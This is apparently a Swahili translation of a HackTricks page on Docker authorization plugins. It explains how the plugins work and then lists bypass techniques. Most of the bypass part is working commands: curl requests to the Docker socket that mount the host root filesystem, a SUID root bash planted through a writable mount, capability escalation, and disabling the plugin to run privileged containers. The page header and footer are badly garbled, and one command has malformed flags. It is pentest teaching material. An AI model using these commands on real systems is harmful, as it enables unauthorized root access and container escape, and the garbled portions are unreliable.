{% hnnt styte=" acceas" %}
GCP Ha& practice ckinH: <img:<img src="/.gitbcok/ass.ts/agte.png"talb=""odata-siz/="line">[**HackTatckt T.aining AWS Red TelmtExp"rt (ARTE)**](ta-size="line">[**HackTricks Training GCP Re)Tmkg/stc="r.giebpokal"zee>/ttdt.png"isl=""data-ize="line">\
Learn & aciceGCP ngs<imgmsrc="/.gipbtok/aHsats/gcte.mag"y>lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"al=""daa-siz="ne">tinhackth ckiuxyzcomurspssgr/a)

<dotsilp>

<oummpr>SupportHackTricks</smmay>

*Chek th [**subsrippangithub.cm/sorsarlosp!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hahktcickr\_kivelive**](https://twitter.com/hacktr\icks\_live)**.**
* **Shareing tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}


**Mfumo wa** **idhini** wa **Docker** ni **kila kitu au chochote**. Mtumiaji yeyote mwenye ruhusa ya kufikia **Docker daemon** anaweza **kufanya** amri yoyote ya mteja wa Docker. Hali hiyo hiyo inatumika kwa wito wanaotumia **API ya Injini** ya Docker kuwasiliana na daemon. Ikiwa unahitaji **udhibiti wa ufikiaji** zaidi, unaweza kuunda **vijitabu vya idhini** na kuviweka kwenye usanidi wa **Docker daemon** yako. Kwa kutumia kijitabu cha idhini, msimamizi wa Docker anaweza **kuunda sera za ufikiaji** za kina kwa ajili ya kusimamia ufikiaji wa **Docker daemon**.

# Msingi wa usanifu

Vijitabu vya Docker Auth ni **vijitabu vya nje** ambavyo unaweza kutumia **kuruhusu/kukataa** **vitendo** vinavyotakiwa kwa **Docker Daemon** **kulingana** na **mtumiaji** aliyeyataka na **kitendo** **kilichotakiwa**.

**[Taarifa ifuatayo ni kutoka kwenye nyaraka](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**

Wakati **ombwe** la **HTTP** linapotolewa kwa **daemon** ya Docker kupitia CLI au kupitia **API ya Injini**, **safu ya uthibitishaji** **inasafirisha** ombi kwa **kijitabu** cha **uthibitishaji** kilichosakinishwa. Ombi lina mtumiaji (mwanakitu) na muktadha wa amri. **Kijitabu** kina jukumu la kuamua ikiwa **kuruhusu** au **kukataa** ombi.

Mchoro wa mfuatano hapa chini unaonyesha mtiririko wa idhini ya kuruhusu na kukataa:

![Authorization Allow flow](https://docs.docker.com/engine/extend/images/authz\_allow.png)

![Authorization Deny flow](https://docs.docker.com/engine/extend/images/authz\_deny.png)

Kila ombi lililotumwa kwa kijitabu **linajumuisha mtumiaji aliyeidhinishwa, vichwa vya HTTP, na mwili wa ombi/jibu**. Ni **jina la mtumiaji** tu na **njia ya uthibitishaji** iliyotumika inayotumwa kwa kijitabu. Muhimu zaidi, **hakuna** **akisi** za mtumiaji au tokeni zinazotumwa. Hatimaye, **sio kila mwili wa ombi/jibu unatumwa** kwa kijitabu cha idhini. Ni wale tu wa mwili wa ombi/jibu ambapo `Content-Type` ni `text/*` au `application/json` ndio wanaotumwa.

Kwa amri ambazo zinaweza kuweza kuingilia uhusiano wa HTTP (`HTTP Upgrade`), kama vile `exec`, kijitabu cha idhini kinaitwa tu kwa ombi la awali la HTTP. Mara kijitabu kinapokubali amri, idhini haitumiki kwa mtiririko wa mabaki. Kwa hakika, data ya mtiririko haitatumwa kwa vijitabu vya idhini. Kwa amri ambazo zinarejesha jibu la HTTP lililokatwa, kama vile `logs` na `events`, ombi la HTTP pekee ndilo linalotumwa kwa vijitabu vya idhini.

Wakati wa usindikaji wa ombi/jibu, mtiririko fulani wa idhini unaweza kuhitaji kufanya maswali ya ziada kwa **Docker daemon**. Ili kukamilisha mtiririko kama huo, vijitabu vinaweza kuita **API ya daemon** kama mtumiaji wa kawaida. Ili kuwezesha maswali haya ya ziada, kijitabu lazima kitoe njia kwa msimamizi kuunda sera sahihi za uthibitishaji na usalama.

## Vijitabu Vingi

Unawajibika kwa **kujiandikisha** kijitabu chako kama sehemu ya **kuanzisha** **Docker daemon**. Unaweza kusakinisha **vijitabu vingi na kuviunganisha pamoja**. Mnyororo huu unaweza kuagizwa. Kila ombi kwa daemon hupita kwa mpangilio kupitia mnyororo. Ni tu wakati **vijitabu vyote vinapotoa ufikiaji** kwa rasilimali, ndipo ufikiaji unapatikana.

# Mifano ya Kijitabu

## Twistlock AuthZ Broker

Kijitabu [**authz**](https://github.com/twistlock/authz) kinakuruhusu kuunda faili rahisi ya **JSON** ambayo **kijitabu** kitakuwa **kikisoma** ili kuidhinisha maombi. Hivyo, inakupa fursa ya kudhibiti kwa urahisi ni vipi **API endpoints** zinaweza kufikiwa na kila mtumiaji.

Hii ni mfano ambao utaruhusu Alice na Bob kuunda kontena mpya: `{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`

Katika ukurasa [route\_parser.go](https://github.com/twistlock/authz/blob/master/core/route\_parser.go) unaweza kupata uhusiano kati ya URL iliyotakiwa na kitendo. Katika ukurasa [types.go](https://github.com/twistlock/authz/blob/master/core/types.go) unaweza kupata uhusiano kati ya jina la kitendo na kitendo.

## Mwongozo wa Kijitabu Rahisi

Unaweza kupata **kijitabu rahisi kueleweka** chenye taarifa za kina kuhusu usakinishaji na urekebishaji hapa: [**https://github.com/carlospolop-forks/authobot**](https://github.com/carlospolop-forks/authobot)

Soma `README` na msimbo wa `plugin.go` ili kuelewa jinsi inavyofanya kazi.

# Docker Auth Plugin Bypass

## Kuorodhesha ufikiaji

Mambo makuu ya kuangalia ni **ni endpoints zipi zimekubaliwa** na **ni thamani zipi za HostConfig zimekubaliwa**.

Ili kufanya kuorodhesha hii unaweza **kutumia chombo** [**https://github.com/carlospolop/docker\_auth\_profiler**](https://github.com/carlospolop/docker\_auth\_profiler)**.**

## kukataa `run --privileged`

### Haki za chini
```bash
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
```
### Running a container and then getting a privileged session

Katika kesi hii, sysadmin **amezuia watumiaji kuunganisha volumu na kuendesha kontena kwa bendera `--privileged`** au kutoa uwezo wowote wa ziada kwa kontena:
```bash
docker run -d --privileged modified-ubuntu
docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
See 'docker run --help'.
```
Hata hivyo, mtumiaji anaweza **kuunda shell ndani ya kontena linaloendesha na kutoa haki za ziada**:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu
#bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de

# Now you can run a shell with --privileged
docker exec -it privileged bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de bash
# With --cap-add=ALL
docker exec -it ---cap-add=ALL bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
# With --cap-add=SYS_ADMIN
docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
```
Sasa, mtumiaji anaweza kutoroka kutoka kwenye kontena akitumia yoyote ya [**mbinu zilizozungumziwa hapo awali**](./#privileged-flag) na **kuinua mamlaka** ndani ya mwenyeji.

## Mount Writable Folder

Katika kesi hii, sysadmin **amekataza watumiaji kuendesha kontena na bendera ya `--privileged`** au kutoa uwezo wowote wa ziada kwa kontena, na aliruhusu tu kuunganisha folda ya `/tmp`:
```bash
host> cp /bin/bash /tmp #Cerate a copy of bash
host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
docker container> chown root:root /host/bash
docker container> chmod u+s /host/bash
host> /tmp/bash
-p #This will give you a shell as root
```
{% hint style="info" %}
Kumbuka kwamba huenda usiweze kuunganisha folda `/tmp` lakini unaweza kuunganisha **folda nyingine inayoweza kuandikwa**. Unaweza kupata saraka zinazoweza kuandikwa kwa kutumia: `find / -writable -type d 2>/dev/null`

**Kumbuka kwamba si saraka zote katika mashine ya linux zitasaidia kipande cha suid!** Ili kuangalia ni saraka zipi zinazosupport kipande cha suid, endesha `mount | grep -v "nosuid"` Kwa mfano, kawaida `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` na `/var/lib/lxcfs` hazisaidii kipande cha suid.

Kumbuka pia kwamba ikiwa unaweza **kuunganisha `/etc`** au folda nyingine yoyote **iliyokuwa na faili za usanidi**, unaweza kuzibadilisha kutoka kwenye kontena la docker kama root ili **uzitumie kwenye mwenyeji** na kupandisha mamlaka (huenda ukibadilisha `/etc/shadow`)
{% endhint %}

## Kipengele cha API Kisichokaguliwa

Wajibu wa sysadmin anayekamilisha plugin hii ni kudhibiti ni vitendo vipi na ni mamlaka gani kila mtumiaji anaweza kutekeleza. Hivyo, ikiwa admin atachukua mbinu ya **blacklist** na viwango na sifa, huenda **akasahau baadhi yao** ambayo yanaweza kumruhusu mshambuliaji **kupandisha mamlaka.**

Unaweza kuangalia API ya docker katika [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#)

## Muundo wa JSON Usio Kagua

### Binds katika root

Inawezekana kwamba wakati sysadmin alikamilisha firewall ya docker alikumbuka **kuhusu parameta muhimu** ya [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) kama "**Binds**".\
Katika mfano ufuatao inawezekana kutumia makosa haya kuunda na kuendesha kontena linalounganisha folda ya root (/) ya mwenyeji:
```bash
docker version #First, find the API version of docker, 1.40 in this example
docker images #List the images available
#Then, a container that mounts the root folder of the host
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "Binds":["/:/host"]}' http:/v1.40/containers/create
docker start f6932bc153ad #Start the created privileged container
docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
#You can access the host filesystem
```
{% hint style="warning" %}
Kumbuka jinsi katika mfano huu tunatumia **`Binds`** param kama ufunguo wa kiwango cha juu katika JSON lakini katika API inaonekana chini ya ufunguo **`HostConfig`**
{% endhint %}

### Binds katika HostConfig

Fuata maelekezo sawa na **Binds katika root** ukifanya hii **ombio** kwa Docker API:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
```
### Mounts in root

Fuata maelekezo sawa na yale ya **Binds in root** ukifanya **ombile** hili kwa API ya Docker:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
```
### Mounts in HostConfig

Fuata maelekezo sawa na yale ya **Binds in root** ukifanya **ombile** hili kwa API ya Docker:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
```
## Unchecked JSON Attribute

Inawezekana kwamba wakati sysadmin alipoandika moto wa docker alisahau kuhusu **sifa muhimu za parameter** ya [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) kama "**Capabilities**" ndani ya "**HostConfig**". Katika mfano ufuatao inawezekana kutumia makosa haya kuunda na kuendesha kontena lenye uwezo wa **SYS\_MODULE**:
```bash
docker version
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
docker start c52a77629a9112450f3dedd1ad94ded17db61244c4249bdfbd6bb3d581f470fa
docker ps
docker exec -it c52a77629a91 bash
capsh --print
#You can abuse the SYS_MODULE capability
```
{% hint style="info" %}
**`HostConfig`** ni ufunguo ambao mara nyingi unashikilia **privileges** **za kuvutia** za kutoroka kutoka kwenye kontena. Hata hivyo, kama tulivyozungumzia hapo awali, zingatia jinsi matumizi ya Binds nje yake pia yanavyofanya kazi na yanaweza kukuruhusu kupita vizuizi.
{% endhint %}

## Kuondoa Plugin

Ikiwa **sysadmin** **alipokosa** **kuzuia** uwezo wa **kuondoa** **plugin**, unaweza kutumia hii kuondoa kabisa!
```bash
docker plugin list #Enumerate plugins

# If you don’t have access to enumerate the plugins you can see the name of the plugin in the error output:
docker: Error response from daemon: authorization denied by plugin authobot:latest: use of Privileged containers is not allowed.
# "authbolt" is the name of the previous plugin

docker plugin disable authobot
docker run --rm -it --privileged -v /:/host ubuntu bash
docker plugin enable authobot
```
Kumbuka ku **re-enable plugin baada ya kupandisha** au **kuanzisha huduma ya docker hakutafanya kazi**!

## Mwandiko wa Bypass ya Auth Plugin

* [https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/](https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/)

## Marejeleo
{% hnt stye="acceas" %}
AWS Ha& practice ckinH:<img :<imgsscc="/.gitb=ok/assgts/aite.png"balo=""kdata-siza="line">[**HackTsscke Tpaigin"aAWS Red Tetm=Exp rt (ARTE)**](a-size="line">[**HackTricks Training AWS Red)ethgasic="..giyb/okseasert/k/.png"l=""data-ize="line">\
Learn & aciceGCP ng<imgsrc="/.gibok/asts/gte.g"lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"salm=""adara-siz>="k>ne">tinhaktckxyzurssgr)

<dtil>

<ummr>SupportHackTricks</smmay>

*Chek th [**subsrippangithub.cm/sorsarlosp!
* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!haktick\_ive\
* **Join  💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
